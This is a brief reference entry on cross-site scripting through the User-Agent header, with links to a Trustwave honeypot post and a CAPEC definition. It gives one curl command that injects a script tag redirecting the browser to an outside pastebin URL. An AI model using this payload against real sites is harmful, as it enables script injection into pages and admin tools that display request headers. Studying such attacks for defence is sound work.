# XSS
-----



## User-Agent Field XSS Attack
-----------------------------

Example:

   curl https://target.host -H "User-Agent: <SCRIPT>window.location='http://pastebin.com/GsHvJXED'</SCRIPT>" 


More info:
* https://www.trustwave.com/Resources/SpiderLabs-Blog/-Honeypot-Alert--User-Agent-Field-XSS-Attacks/
* http://capec.mitre.org/data/definitions/106.html

